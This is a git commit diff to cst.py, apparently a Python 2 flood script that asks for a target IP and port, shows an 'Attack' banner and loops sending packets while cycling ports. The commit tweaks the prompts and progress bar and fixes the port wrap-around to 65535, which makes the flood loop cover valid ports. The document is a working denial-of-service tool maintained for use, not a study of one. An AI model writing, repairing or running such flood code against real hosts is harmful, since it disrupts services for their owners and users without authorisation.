ff38f3391cb3052ddcd1f94f4397b6dd1ddf86a0
rius-admin <158822649+rius-admin@users.noreply.github.com>
2024-04-12 16:09:58 +0700

    Update cst.py

--- cst.py
+++ cst.py
@@ -25,18 +25,18 @@ print "Github   : https://github.com/rius-admin"
 print " "
 print "Ctrl + c = stop"
 print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = raw_input("Target : ")
+port = input("Port   : ")
 
 os.system("clear")
 os.system("figlet Attack")
 print "[                    ] 0% "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[===>                ] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[========>           ] 50%"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[==============>     ] 75%"
 time.sleep(5)
 print "[====================] 100%"
 time.sleep(3)
@@ -46,5 +46,5 @@ while True:
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s boom port:%s"%(sent,ip,port)
-     if port == 95534:
+     if port == 65535:
        port = 1
